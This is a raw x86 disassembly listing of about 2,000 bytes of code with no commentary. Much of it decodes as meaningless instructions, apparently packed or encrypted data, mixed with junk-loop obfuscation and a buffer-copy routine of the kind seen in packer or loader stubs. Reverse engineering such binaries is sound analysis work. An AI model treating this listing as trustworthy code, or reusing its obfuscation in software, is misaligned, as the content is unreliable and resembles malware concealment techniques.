  4101ba:	pop    ss
  4101bb:	inc    eax
  4101bc:	push   edi
  4101bd:	gs pop ss
  4101bf:	ins    BYTE PTR es:[edi],dx
  4101c0:	inc    ebx
  4101c1:	jl     0x4101b8
  4101c3:	and    al,BYTE PTR [di-0x3c4]
  4101c8:	nop
  4101c9:	xor    cl,BYTE PTR [ebx+0x3d]
  4101cc:	call   0x5268542
  4101d1:	clc    
  4101d2:	pop    esi
  4101d3:	jmp    0x410219
  4101d5:	inc    esp
  4101d6:	inc    DWORD PTR [ecx+0x3f]
  4101d9:	retf   0xed90
  4101dc:	pop    edi
  4101dd:	dec    eax
  4101de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101df:	movntps XMMWORD PTR [ecx],xmm5
  4101e2:	jp     0x41023e
  4101e4:	xchg   esp,eax
  4101e5:	dec    ecx
  4101e6:	data16 icebp 
  4101e8:	mov    ebx,0xb0451bff
  4101ed:	mov    edi,0xb29aaabc
  4101f2:	pop    ecx
  4101f3:	push   es
  4101f4:	out    dx,al
  4101f5:	sub    eax,esi
  4101f7:	mov    ?,esp
  4101f9:	jae    0x4101cd
  4101fb:	jmp    0xe77f:0x99c5b908
  410202:	push   ds
  410203:	xor    ecx,DWORD PTR [edi-0xab31cd2]
  410209:	sbb    DWORD PTR [edx+0x7c],edi
  41020c:	lods   eax,DWORD PTR ds:[esi]
  41020d:	js     0x410237
  41020f:	scas   eax,DWORD PTR es:[edi]
  410210:	push   ss
  410211:	adc    eax,0x8cd58a93
  410216:	shl    DWORD PTR [ebx],cl
  410218:	test   DWORD PTR [ecx],eax
  41021a:	test   DWORD PTR [eax-0x1a66e0bf],esi
  410220:	shr    BYTE PTR [ebx],1
  410222:	iret   
  410223:	popf   
  410224:	shl    DWORD PTR [ebx+0x7],0xa2
  410228:	mov    WORD PTR [eax-0xb],fs
  41022b:	dec    eax
  41022c:	lds    edx,FWORD PTR [edx+0x72]
  41022f:	xchg   esi,eax
  410230:	sub    al,0x42
  410232:	int    0x69
  410234:	addr16 out 0xdf,al
  410237:	push   0x9e22f875
  41023c:	cmp    cl,BYTE PTR [edi+edi*4+0x4a3c4e23]
  410243:	call   0x4a74:0x569b56b1
  41024a:	loopne 0x4101d9
  41024c:	add    BYTE PTR [eax+eiz*2+0x22],ah
  410250:	test   al,0x8c
  410252:	mov    fs,WORD PTR [eax-0x77193083]
  410258:	inc    ecx
  410259:	pop    es
  41025a:	mov    al,0x14
  41025c:	mov    al,0xe5
  41025e:	or     eax,eax
  410260:	add    eax,0xaa1b0f9c
  410265:	jp     0x410218
  410267:	push   esi
  410268:	sub    DWORD PTR [edi],edx
  41026a:	jecxz  0x4102d6
  41026c:	cld    
  41026d:	mov    ebp,0x8522bfab
  410272:	aas    
  410273:	inc    ebp
  410274:	cmp    BYTE PTR [edx+0x5c],bl
  410277:	hlt    
  410278:	or     DWORD PTR [ecx-0x184e0ebf],0xfffffff7
  41027f:	push   ebx
  410280:	xor    BYTE PTR [esp+ecx*8+0x4e1cdf5c],0x5a
  410288:	out    0x15,al
  41028a:	xchg   edi,eax
  41028b:	sub    ah,BYTE PTR [eax]
  41028d:	adc    ebp,DWORD PTR [edi+esi*1-0x670711da]
  410294:	pop    esi
  410295:	mov    esi,DWORD PTR [ebp-0x8]
  410298:	mov    DWORD PTR ds:0x4337eb,0x5b5
  4102a2:	xor    eax,edx
  4102a4:	xor    esi,edx
  4102a6:	add    eax,ecx
  4102a8:	sub    DWORD PTR ds:0x43370f,0x433803
  4102b2:	add    esi,ecx
  4102b4:	imul   eax,esi
  4102b7:	jmp    0x41034e
  4102bc:	mov    DWORD PTR ds:0x433713,0x12
  4102c6:	cmp    DWORD PTR ds:0x433713,0x0
  4102cd:	je     0x410313
  4102d3:	cmp    DWORD PTR ds:0x433713,0x7
  4102da:	jne    0x4102eb
  4102e0:	push   0x1099
  4102e5:	call   DWORD PTR ds:0x412038
  4102eb:	cmp    DWORD PTR ds:0x433713,0x8
  4102f2:	jne    0x410303
  4102f8:	mov    eax,ds:0x433713
  4102fd:	dec    eax
  4102fe:	mov    ds:0x433713,eax
  410303:	mov    eax,ds:0x433713
  410308:	dec    eax
  410309:	mov    ds:0x433713,eax
  41030e:	jmp    0x4102c6
  410313:	mov    eax,DWORD PTR [ebp+0xc]
  410316:	mov    eax,DWORD PTR [eax+0x78]
  410319:	mov    DWORD PTR [ebp+0xc],eax
  41031c:	mov    eax,DWORD PTR [ebp-0x4]
  41031f:	mov    esi,DWORD PTR [ebp-0x8]
  410322:	xor    eax,edx
  410324:	xor    esi,edx
  410326:	add    eax,ecx
  410328:	add    esi,ecx
  41032a:	imul   eax,esi
  41032d:	mov    esi,DWORD PTR [ebp+0xc]
  410330:	cmp    esi,eax
  410332:	mov    eax,DWORD PTR [ebp-0x4]
  410335:	je     0x40ffbc
  41033b:	xor    eax,edx
  41033d:	add    eax,ecx
  41033f:	mov    ecx,DWORD PTR [ebp+0xc]
  410342:	imul   eax,ecx
  410345:	add    eax,DWORD PTR [ebp+0x8]
  410348:	mov    DWORD PTR [ebp+0xc],eax
  41034b:	mov    eax,DWORD PTR [ebp+0xc]
  41034e:	pop    esi
  41034f:	leave  
  410350:	ret    0x8
  410353:	push   ebp
  410354:	mov    ebp,esp
  410356:	push   ecx
  410357:	and    DWORD PTR ds:0x43370f,0x0
  410361:	jmp    0x410371
  410366:	mov    eax,ds:0x43370f
  41036b:	inc    eax
  41036c:	mov    ds:0x43370f,eax
  410371:	cmp    DWORD PTR ds:0x43370f,0x11
  410378:	jae    0x4103b4
  41037e:	cmp    DWORD PTR ds:0x43370f,0x9
  410385:	jne    0x410391
  41038b:	call   DWORD PTR ds:0x41203c
  410391:	cmp    DWORD PTR ds:0x43370f,0x8
  410398:	jne    0x4103a9
  41039e:	mov    eax,ds:0x43370f
  4103a3:	inc    eax
  4103a4:	mov    ds:0x43370f,eax
  4103a9:	jmp    0x410366
  4103ae:	xor    DWORD PTR ds:0x43371f,edi
  4103b4:	push   ecx
  4103b5:	add    DWORD PTR ds:0x43377f,0x4337bf
  4103bf:	mov    eax,0xf89c8531
  4103c4:	or     edx,DWORD PTR ds:0x433767
  4103ca:	mov    DWORD PTR [ebp-0x8],eax
  4103cd:	jmp    0x41065e
  4103d2:	jne    0x4103d9
  4103d4:	dec    eax
  4103d5:	cs push 0xee457173
  4103db:	xchg   edx,eax
  4103dc:	or     DWORD PTR [ebp-0x47a19a4b],esp
  4103e2:	and    eax,0xea7e7ebd
  4103e7:	jl     0x410467
  4103e9:	jle    0x4103a9
  4103eb:	fist   DWORD PTR [edi]
  4103ed:	ins    DWORD PTR es:[edi],dx
  4103ee:	jl     0x410468
  4103f0:	mov    ds:0x75ca437,eax
  4103f5:	add    eax,0x98fceeea
  4103fa:	lods   al,BYTE PTR ds:[esi]
  4103fb:	mov    al,ds:0x9a007618
  410400:	fiadd  WORD PTR [edi+0x6d]
  410403:	std    
  410404:	mov    BYTE PTR [ebx+0x30e681c9],dh
  41040a:	repnz out 0xbf,al
  41040d:	or     DWORD PTR [ebp+edi*8-0x4b],eax
  410411:	pop    ss
  410412:	aaa    
  410413:	mov    al,0x71
  410415:	es cmp ah,ah
  410418:	pop    es
  410419:	ret    0xe0da
  41041c:	out    dx,al
  41041d:	push   ecx
  41041e:	push   esi
  41041f:	mov    edx,0xce764efb
  410424:	into   
  410425:	hlt    
  410426:	out    0x13,al
  410428:	xchg   edi,eax
  410429:	and    DWORD PTR [edx-0x46],esp
  41042c:	xor    ebx,DWORD PTR [edi+0x65]
  41042f:	jmp    DWORD PTR [esi+0x7a]
  410432:	sub    al,0x39
  410434:	add    al,0x76
  410436:	jae    0x410406
  410438:	pop    eax
  410439:	lds    edi,FWORD PTR [ebx]
  41043b:	leave  
  41043c:	aad    0x5b
  41043e:	gs mov ch,0x1e
  410441:	ins    DWORD PTR es:[edi],dx
  410442:	popf   
  410443:	in     eax,0xd7
  410445:	push   ebp
  410446:	sbb    al,0x7f
  410448:	scas   al,BYTE PTR es:[edi]
  410449:	int    0xea
  41044b:	lods   al,BYTE PTR ds:[esi]
  41044c:	mov    ch,0xbc
  41044e:	ret    
  41044f:	inc    ebx
  410450:	in     eax,0x31
  410452:	jo     0x410469
  410454:	mov    ebx,0x54e4f235
  410459:	test   eax,0x9cb88641
  41045e:	pop    eax
  41045f:	or     DWORD PTR [esi],edx
  410461:	jle    0x4103e6
  410463:	shr    DWORD PTR gs:[ebp+0x46f84ff],cl
  41046a:	cmp    BYTE PTR [ebx],al
  41046c:	mov    eax,0xe55c5302
  410471:	push   es
  410472:	add    al,0xd6
  410474:	call   0xbe3b0ee9
  410479:	mov    eax,ds:0x7bb53449
  41047e:	dec    ecx
  41047f:	jmp    0x410423
  410481:	add    al,0x60
  410483:	or     ah,bh
  410485:	inc    edi
  410486:	push   ebp
  410487:	and    edi,DWORD PTR ss:[ebp+0x26]
  41048b:	push   ecx
  41048c:	mov    DWORD PTR [eax],eax
  41048e:	retf   
  41048f:	push   es
  410490:	xor    BYTE PTR [edx+0x567c802a],bh
  410496:	out    dx,eax
  410497:	data16 stc 
  410499:	cmp    DWORD PTR [eax+0x420b9074],eax
  41049f:	adc    eax,0xdfa1f1fa
  4104a4:	mov    esp,DWORD PTR [edx-0x5a]
  4104a7:	xchg   ebp,eax
  4104a8:	iret   
  4104a9:	and    al,0x4e
  4104ab:	push   ds
  4104ac:	sti    
  4104ad:	xchg   ebx,eax
  4104ae:	xor    DWORD PTR [eax-0x6f],0x892612a3
  4104b5:	popf   
  4104b6:	mov    esi,0xe060495a
  4104bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104bc:	dec    edi
  4104bd:	iret   
  4104be:	nop    DWORD PTR [esi+0x4b]
  4104c2:	(bad)  
  4104c3:	in     eax,0x60
  4104c5:	jp     0x4104d4
  4104c7:	jbe    0x4104cc
  4104c9:	pop    ss
  4104ca:	dec    edx
  4104cb:	cmp    al,0x60
  4104cd:	dec    edi
  4104ce:	xchg   edi,eax
  4104cf:	idiv   DWORD PTR [edi-0x7f]
  4104d2:	add    BYTE PTR [edx-0x63c9066a],dl
  4104d8:	loopne 0x410550
  4104da:	stos   BYTE PTR es:[edi],al
  4104db:	lock pop ss
  4104dd:	add    BYTE PTR [esi-0x203735cd],ch
  4104e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104e4:	mov    ds:0xd141c0da,al
  4104e9:	mov    edi,0x8eb31d65
  4104ee:	xchg   ebp,eax
  4104ef:	xor    al,0x1d
  4104f1:	hlt    
  4104f2:	pop    ecx
  4104f3:	and    al,ah
  4104f5:	mov    eax,ds:0xcf731d13
  4104fa:	and    al,0x6f
  4104fc:	lods   al,BYTE PTR ds:[esi]
  4104fd:	mov    al,0x39
  4104ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410500:	jo     0x4104cb
  410502:	std    
  410503:	gs cmp al,0x18
  410506:	jge    0x410532
  410508:	test   al,cl
  41050a:	cwde   
  41050b:	jge    0x41050c
  41050d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41050e:	mov    ebx,DWORD PTR [esi-0x4c]
  410511:	mov    dl,BYTE PTR [eax]
  410513:	arpl   WORD PTR [edi+0x65],bp
  410516:	pop    edi
  410517:	jne    0x4104d2
  410519:	imul   ebp,DWORD PTR [ecx+0x69],0x6573ef71
  410520:	vpsraw xmm7,xmm3,XMMWORD PTR [edx]
  410524:	das    
  410525:	pop    ss
  410526:	sbb    eax,0xe4fbf946
  41052b:	pushf  
  41052c:	pushf  
  41052d:	sub    BYTE PTR [eax+0x3],dh
  410530:	jb     0x4104ba
  410532:	add    DWORD PTR [edx-0x34],0xffffffc3
  410536:	add    eax,0x6fd52b68
  41053b:	loop   0x410522
  41053d:	mov    eax,0xf20b31e5
  410542:	jno    0x41055d
  410544:	sar    DWORD PTR ds:[eax+0x4b],1
  410548:	pop    ecx
  410549:	jns    0x41051b
  41054b:	adc    cl,ah
  41054d:	mov    esp,0xc98774f
  410552:	mov    eax,ds:0x1e4e41b
  410557:	scas   eax,DWORD PTR es:[edi]
  410558:	iret   
  410559:	sub    al,0xba
  41055b:	jecxz  0x4105ca
  41055d:	sbb    dl,BYTE PTR [esi+0x5a]
  410560:	mov    al,0x85
  410562:	aaa    
  410563:	dec    ebp
  410564:	sbb    esp,DWORD PTR [ecx+0x3f]
  410567:	loope  0x41053e
  410569:	mov    esp,0x409ae85a
  41056e:	sub    esp,esi
  410570:	jle    0x4105d7
  410572:	jb     0x4105db
  410574:	ja     0x410567
  410576:	arpl   WORD PTR [ecx],sp
  410578:	mov    bl,0xed
  41057a:	(bad)  
  41057b:	or     dh,BYTE PTR [edi-0x31]
  41057e:	inc    edx
  41057f:	mov    esp,0xf718356a
  410584:	push   esi
  410585:	test   BYTE PTR [ebx],ch
  410587:	les    esi,FWORD PTR [ebx+eax*8+0x1c]
  41058b:	push   es
  41058c:	xor    al,0xc1
  41058e:	fnstenv [ebx]
  410590:	leave  
  410591:	jg     0x410517
  410593:	xor    eax,0x69bd6f2c
  410598:	jb     0x4105f8
  41059a:	fimul  WORD PTR [ebx]
  41059c:	lock int 0x70
  41059f:	int    0xd
  4105a1:	push   esi
  4105a2:	mov    edx,0xc12b5157
  4105a7:	mov    edx,0x8ad1320b
  4105ac:	or     DWORD PTR [eax-0x5d],0xbb0edffa
  4105b3:	sub    DWORD PTR [eax-0x72f663d3],ebx
  4105b9:	pop    edx
  4105ba:	jbe    0x410581
  4105bc:	daa    
  4105bd:	sub    ax,0xbf11
  4105c1:	fistp  DWORD PTR [ecx+edx*8-0x32bfac36]
  4105c8:	ds std 
  4105ca:	daa    
  4105cb:	cmp    eax,0xda689f2e
  4105d0:	and    eax,DWORD PTR [ebp+0x12]
  4105d3:	mov    cl,0x1
  4105d5:	mov    DWORD PTR [eax+0x418788ad],ebx
  4105db:	jns    0x41065b
  4105dd:	imul   edi,eax,0x4e
  4105e0:	sbb    dl,BYTE PTR [ecx]
  4105e2:	push   ss
  4105e3:	dec    eax
  4105e4:	daa    
  4105e5:	(bad)  
  4105e6:	cli    
  4105e7:	mov    eax,ds:0x24609d69
  4105ec:	inc    edi
  4105ed:	pop    esp
  4105ee:	pushf  
  4105ef:	shl    BYTE PTR [ebp-0x17],1
  4105f2:	aas    
  4105f3:	push   esp
  4105f4:	in     al,0x3b
  4105f6:	jg     0x4105b3
  4105f8:	pop    DWORD PTR [ebx-0x79c575b9]
  4105fe:	stc    
  4105ff:	sbb    ebx,DWORD PTR [edi]
  410601:	ret    
  410602:	sub    al,0xef
  410604:	in     eax,0x34
  410606:	add    al,0x3e
  410608:	cwde   
  410609:	jo     0x4105aa
  41060b:	mov    ah,0x3
  41060d:	ret    0x6edc
  410610:	ror    BYTE PTR [esi],0x7
  410613:	jle    0x41065a
  410615:	icebp  
  410616:	pop    esi
  410617:	idiv   DWORD PTR [edx]
  410619:	push   0x26fa94f4
  41061e:	mov    dh,0x28
  410620:	shl    DWORD PTR [ebp-0x3a94811e],cl
  410626:	or     BYTE PTR [ebx],ch
  410628:	shl    DWORD PTR [edi+0x340dc564],cl
  41062e:	pop    esp
  41062f:	sti    
  410630:	or     cl,cl
  410632:	std    
  410633:	mov    ah,0x86
  410635:	popa   
  410636:	mov    edx,0x61cf56aa
  41063b:	sbb    DWORD PTR [eax-0x1d],eax
  41063e:	popa   
  41063f:	push   ebx
  410640:	jecxz  0x4105da
  410642:	jae    0x4106af
  410644:	fild   QWORD PTR ds:0x9469e2f9
  41064a:	or     al,dh
  41064c:	pop    eax
  41064d:	iret   
  41064e:	lds    ebx,FWORD PTR [edx]
  410650:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410651:	nop
  410652:	(bad)  
  410653:	aaa    
  410654:	retf   0xc36c
  410657:	inc    ebp
  410658:	adc    DWORD PTR [ebx+esi*4-0x38688d50],edx
  41065f:	inc    ebp
  410660:	cld    
  410661:	xor    al,BYTE PTR [ebp+0x2581f89c]
  410667:	adc    esi,DWORD PTR [edi]
  410669:	inc    ebx
  41066a:	add    BYTE PTR [eax],al
  41066c:	add    BYTE PTR [eax],al
  41066e:	add    BYTE PTR [ebx+0x43371315],cl
  410674:	add    BYTE PTR [edx-0x77],al
  410677:	adc    eax,0x433713
  41067c:	cmp    DWORD PTR ds:0x433713,0x22
  410683:	jne    0x410692
  410689:	push   DWORD PTR [ebp-0x20]
  41068c:	call   DWORD PTR ds:0x412040
  410692:	cmp    DWORD PTR ds:0x433713,0x12
  410699:	jb     0x41066f
  41069f:	xor    edx,edx
  4106a1:	or     edx,DWORD PTR ds:0x4337ef
  4106a7:	sbb    edx,DWORD PTR ds:0x43371b
  4106ad:	mov    DWORD PTR ds:0x4337ef,edx
  4106b3:	mov    edx,DWORD PTR [ebp-0x8]
  4106b6:	mov    DWORD PTR ds:0x433733,0x17
  4106c0:	cmp    DWORD PTR ds:0x433733,0x0
  4106c7:	je     0x410724
  4106cd:	cmp    DWORD PTR ds:0x433733,0xc
  4106d4:	jne    0x4106ee
  4106da:	push   0x4338fc
  4106df:	push   DWORD PTR [ebp-0x1c]
  4106e2:	push   DWORD PTR [ebp-0x18]
  4106e5:	push   DWORD PTR [ebp-0x1c]
  4106e8:	call   DWORD PTR ds:0x4121e8
  4106ee:	cmp    DWORD PTR ds:0x433733,0xd
  4106f5:	jne    0x410708
  4106fb:	mov    ecx,DWORD PTR ds:0x433733
  410701:	dec    ecx
  410702:	mov    DWORD PTR ds:0x433733,ecx
  410708:	mov    ecx,DWORD PTR ds:0x433733
  41070e:	dec    ecx
  41070f:	mov    DWORD PTR ds:0x433733,ecx
  410715:	jmp    0x4106c0
  41071a:	mov    DWORD PTR ds:0x4337f3,0x1fcc
  410724:	push   esi
  410725:	xor    DWORD PTR ds:0x4337b7,ebx
  41072b:	mov    ecx,0x7510854
  410730:	sbb    DWORD PTR ds:0x433717,ecx
  410736:	xor    edx,ecx
  410738:	mov    esi,0x32729b
  41073d:	adc    DWORD PTR ds:0x433727,0x4337ab
  410747:	push   edi
  410748:	mov    edi,DWORD PTR [ebp+0x10]
  41074b:	add    edx,esi
  41074d:	cmp    edi,edx
  41074f:	je     0x410a59
  410755:	mov    edx,DWORD PTR [ebp-0x8]
  410758:	mov    eax,DWORD PTR [ebp-0x4]
  41075b:	xor    eax,ecx
  41075d:	mov    edi,0xffcd8d65
  410762:	sub    edi,eax
  410764:	add    edi,DWORD PTR [ebp+0x10]
  410767:	xor    edx,ecx
  410769:	add    edx,esi
  41076b:	cmp    edx,edi
  41076d:	ja     0x410a54
  410773:	push   ebx
  410774:	jmp    0x41077e
  410779:	mov    esi,0x32729b
  41077e:	mov    eax,DWORD PTR [ebp-0x8]
  410781:	mov    edi,DWORD PTR [ebp-0x4]
  410784:	xor    edi,ecx
  410786:	add    edi,esi
  410788:	mov    esi,DWORD PTR [ebp+0x8]
  41078b:	imul   edi,edx
  41078e:	mov    ebx,DWORD PTR [ebp+0xc]
  410791:	xor    eax,ecx
  410793:	add    eax,edx
  410795:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  41079c:	mov    BYTE PTR [edi+esi*1],al
  41079f:	mov    eax,DWORD PTR [ebp-0x4]
  4107a2:	xor    eax,ecx
  4107a4:	lea    edx,[edx+eax*1+0x32729b]
  4107ab:	mov    eax,DWORD PTR [ebp-0x4]
  4107ae:	xor    eax,ecx
  4107b0:	mov    esi,0xffcd8d65
  4107b5:	sub    esi,eax
  4107b7:	add    esi,DWORD PTR [ebp+0x10]
  4107ba:	cmp    edx,esi
  4107bc:	jbe    0x410779
  4107c2:	pop    ebx
  4107c3:	jmp    0x410a54
  4107c8:	out    dx,eax
  4107c9:	adc    al,0x6b
  4107cb:	adc    esi,DWORD PTR [ecx+0x71]
  4107ce:	ja     0x4107c0
  4107d0:	or     DWORD PTR [eax],0x28
  4107d3:	icebp  
  4107d4:	ins    DWORD PTR es:[edi],dx
  4107d5:	fdiv   DWORD PTR [esi+0x7ebb9166]
  4107db:	jle    0x4107c7
  4107dd:	jl     0x41085d
  4107df:	jle    0x410794
  4107e1:	inc    esp
  4107e2:	jne    0x410834
  4107e4:	ret    
  4107e5:	pop    eax
  4107e6:	shl    DWORD PTR [eax+0x21],1
  4107e9:	jnp    0x410846
  4107eb:	(bad)  
  4107ec:	fild   DWORD PTR [ebx]
  4107ee:	xor    BYTE PTR [ebp-0x15],ch
  4107f1:	mov    al,ds:0x643fd9d9
  4107f6:	xchg   ebp,eax
  4107f7:	ins    DWORD PTR es:[edi],dx
  4107f8:	xor    eax,0x8f713442
  4107fd:	cmp    al,0x71
  4107ff:	mov    ecx,0x4aa967c
  410804:	cli    
  410805:	retf   0x9065
  410808:	adc    ch,BYTE PTR [edx]
  41080a:	or     BYTE PTR [esi-0x79],0xd1
  41080e:	pop    edx
  41080f:	add    BYTE PTR ds:0x14ff0a08,cl
  410815:	fsubr  st,st(4)
  410817:	les    edi,FWORD PTR [ecx-0x32]
  41081a:	mov    dl,BYTE PTR [ebx]
  41081c:	cmp    ecx,DWORD PTR [esi]
  41081e:	mov    DWORD PTR ds:0xbf62653f,esi
  410824:	dec    esp
  410825:	stos   BYTE PTR es:[edi],al
  410826:	xchg   esi,eax
  410827:	(bad)
  41082a:	jmp    0x8d54:0x823947f2
  410831:	loope  0x410871
  410833:	cmp    eax,0x2d82c54a
  410838:	ret    0x3f1
  41083b:	rcl    DWORD PTR [ebp+eiz*1-0x4bfff03e],0x29
  410843:	xchg   BYTE PTR ds:0xce9ced1f,bl
  410849:	mov    ds:0x199918c2,eax
  41084e:	and    al,0xd9
  410850:	fld    st(4)
  410852:	inc    edx
  410853:	jno    0x4107fd
  410855:	shl    eax,cl
  410857:	push   ds
  410858:	iret   
  410859:	aas    
  41085a:	sub    edx,DWORD PTR [ebx-0x6c]
  41085d:	inc    ecx
  41085e:	cdq    
  41085f:	(bad)  
  410860:	or     ebp,DWORD PTR [ebx+ebx*4-0x2d]
  410864:	cmp    al,0x26
  410866:	xor    DWORD PTR [di-0x2d],esp
  41086a:	mov    WORD PTR [edi+0x6de5845d],es
  410870:	das    
  410871:	jns    0x41080c
  410873:	data16 sub BYTE PTR [ebx],ah
  410876:	or     BYTE PTR [eax+eiz*1],0x87
  41087a:	loopne 0x4108b9
  41087c:	sub    eax,ebx
  41087e:	add    bh,BYTE PTR [eax+0xc]
  410881:	enter  0x532a,0x39
  410885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410886:	and    esi,DWORD PTR [ebp-0x2d]
  410889:	jbe    0x41083b
  41088b:	jg     0x41089e
  41088d:	add    al,0x45
  41088f:	fsub   QWORD PTR [ecx]
  410891:	pop    edx
  410892:	push   edi
  410893:	sti    
  410894:	xchg   bl,ch
  410896:	pop    edi
  410897:	jle    0x41084a
  410899:	fistp  WORD PTR [ebp+0x34d67a19]
  41089f:	pop    esp
  4108a0:	adc    al,0xd2
  4108a2:	add    ah,bl
  4108a4:	fdiv   st(6),st
  4108a6:	daa    
  4108a7:	int3   
  4108a8:	adc    ecx,0xa1e08f9e
  4108ae:	pop    edx
  4108b0:	mov    ebx,0x9887ac35
  4108b5:	push   ss
  4108b6:	xor    DWORD PTR [esi],eax
  4108b8:	mov    ch,0xdc
  4108ba:	ins    BYTE PTR es:[edi],dx
  4108bb:	dec    ebx
  4108bc:	es add bh,bh
  4108bf:	popa   
  4108c0:	rcr    BYTE PTR [edx],cl
  4108c2:	xchg   edx,eax
  4108c3:	aas    
  4108c4:	jns    0x4108b2
  4108c6:	mov    edi,0xd254f663
  4108cb:	or     cl,ah
  4108cd:	sbb    eax,0x8fc2eba6
  4108d2:	pop    esp
  4108d3:	dec    edx
  4108d4:	ret    0x48d3
  4108d7:	in     eax,0x8f
  4108d9:	or     eax,0x5119f030
  4108de:	adc    eax,ebp
  4108e0:	add    eax,0x1effb751
  4108e5:	or     BYTE PTR [ebp+0x529a40fd],0x35
  4108ec:	cld    
  4108ed:	std    
  4108ee:	sbb    cl,dl
  4108f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108f1:	mov    DWORD PTR [ebx],ecx
  4108f3:	cld    
  4108f4:	outs   dx,DWORD PTR ds:[esi]
  4108f5:	retf   0xe0fa
  4108f8:	js     0x4108f7
  4108fa:	adc    al,0xe6
  4108fc:	and    BYTE PTR [edx],dl
  4108fe:	dec    edx
  4108ff:	add    cl,BYTE PTR [esi+0x62d93165]
  410905:	dec    esi
  410906:	jmp    0xda70f854
  41090b:	adc    eax,0x515b75c4
  410910:	push   ss
  410911:	mov    cl,0x91
  410913:	inc    eax
  410914:	fnstenv [eax+0x41]
  410917:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  410919:	enter  0x3113,0xbb
  41091d:	cmp    dh,ch
  41091f:	in     eax,0x2a
  410921:	mov    WORD PTR [ebx+0xc],fs
  410924:	mov    eax,ds:0xcb20adc8
  410929:	test   ebp,ebx
  41092b:	jns    0x41099d
  41092d:	pop    esi
  41092e:	das    
  41092f:	stc    
  410930:	jne    0x410961
  410932:	jecxz  0x41092e
  410934:	stos   BYTE PTR es:[edi],al
  410935:	in     al,0x22
  410937:	and    ch,0x26
  41093a:	mov    eax,0xee01a332
  41093f:	loopne 0x410990
  410941:	xchg   ecx,eax
  410942:	inc    edi
  410943:	pop    edi
  410944:	or     al,0x52
  410946:	fdivp  st(0),st
  410948:	mov    al,0x6a
  41094a:	in     eax,0x28
  41094c:	and    edx,DWORD PTR [ecx]
  41094e:	aam    0x5b
  410950:	mov    dh,0xaf
  410952:	and    eax,0x2bab77e0
  410957:	pop    ds
  410958:	inc    ecx
  410959:	popa   
  41095a:	and    DWORD PTR [edx+edx*8],ecx
  41095d:	pop    eax
  41095e:	test   al,0xb9
  410960:	sub    DWORD PTR [ebx],edx
  410962:	fdivrp st(5),st
  410964:	mov    bh,0xad
  410966:	jge    0x410975
  410968:	hlt    
  410969:	jnp    0x410981
  41096b:	int    0x71
  41096d:	sub    eax,DWORD PTR [edx+0x69289e30]
  410973:	jmp    0x41090a
  410975:	inc    ecx
  410976:	pop    ss
  410977:	sub    eax,0xdbbc48f7
  41097c:	xchg   al,bh
  41097e:	cmp    eax,0xdc5dd6e4
  410983:	push   esi
  410984:	dec    ebp
  410985:	inc    eax
  410986:	push   ss
  410987:	mov    ds:0x64dd083a,al
  41098c:	(bad)  
  41098d:	cmp    ch,al
  41098f:	xchg   BYTE PTR [esi+eax*2+0x1c],bh
  410993:	jae    0x4109fc
  410995:	mov    BYTE PTR [eax-0x687776de],dl
  41099b:	aaa    
  41099c:	call   0x86a7:0xaeec1ff9
  4109a3:	pop    eax
  4109a4:	js     0x410941
  4109a6:	xchg   DWORD PTR [ecx],eax
  4109a8:	xlat   BYTE PTR ds:[ebx]
  4109a9:	cmp    cl,BYTE PTR [esi-0x7e569564]
  4109af:	push   esp
  4109b0:	out    dx,eax
  4109b1:	test   eax,0x72d8a76e
  4109b6:	loope  0x4109a8
  4109b8:	lea    ebx,[ebp+0x1772b8b2]
  4109be:	sbb    esp,ebp
  4109c0:	xor    BYTE PTR [edi-0x4a],bl
  4109c3:	(bad)
  4109c6:	push   0xffffffe1
  4109c8:	xor    esp,0x29
  4109cb:	(bad)  
  4109cc:	xlat   BYTE PTR ds:[ebx]
  4109cd:	(bad)  
  4109ce:	or     BYTE PTR [ecx+0x15],al
  4109d1:	mov    ds:0xa2f0e294,eax
  4109d7:	popf   
  4109d8:	les    eax,FWORD PTR [edi]
  4109da:	stos   DWORD PTR es:[edi],eax
  4109db:	cmp    dh,dl
  4109dd:	pop    edx
  4109de:	xchg   BYTE PTR [ebx],bh
  4109e0:	jl     0x4109ac
  4109e2:	stc    
  4109e3:	fcmovb st,st(2)
  4109e5:	int3   
  4109e6:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4109e8:	aaa    
  4109e9:	or     ah,ch
  4109eb:	fstp   TBYTE PTR [esi-0x57]
  4109ee:	pop    es
  4109ef:	mov    esi,0x3c6478b3
  4109f4:	jp     0x410a3b
  4109f6:	test   DWORD PTR [eax],eax
  4109f8:	sub    BYTE PTR [ebp-0x4bd605ed],ch
  4109fe:	sub    eax,0x2762fd1f
  410a03:	ja     0x4109fb
  410a05:	cmp    esp,edi
  410a07:	popa   
  410a08:	mov    ds:0x85ef705a,eax
  410a0d:	enter  0xd52c,0x91
  410a11:	cld    
  410a12:	clc    
  410a13:	xor    DWORD PTR [edx+0x4e6d961d],edx
  410a19:	mov    dl,0x43
  410a1b:	push   ds
  410a1c:	das    
  410a1d:	fnstsw WORD PTR [ebx+eiz*1-0x3c]
  410a21:	add    BYTE PTR [ebx+0x678c18b6],0xe
  410a28:	push   ecx
  410a29:	sti    
  410a2a:	mov    ebx,ecx
  410a2c:	scas   eax,DWORD PTR es:[edi]
  410a2d:	mov    ecx,0xc91a823c
  410a32:	mov    bl,0xac
  410a34:	add    eax,0x65e4e19e
  410a39:	or     DWORD PTR [eax-0x48],esi
  410a3c:	rcl    DWORD PTR [esi+0x77cc269f],0xbf
  410a43:	xchg   esi,eax
  410a44:	jg     0x4109c7
  410a46:	add    edi,DWORD PTR [eax-0x56a1e341]
  410a4c:	int3   
  410a4d:	and    DWORD PTR [edi+0x73],edi
  410a50:	xor    bl,BYTE PTR [eax+esi*8]
  410a53:	inc    ebp
  410a54:	mov    eax,0xf89c8532
  410a59:	pop    edi
  410a5a:	pop    esi
  410a5b:	leave  
  410a5c:	ret    0xc
  410a5f:	push   ebp
  410a60:	mov    ebp,esp
  410a62:	mov    eax,DWORD PTR [ebp+0xc]
  410a65:	xor    edx,edx
  410a67:	mov    ecx,0x7264fca9
  410a6c:	div    ecx
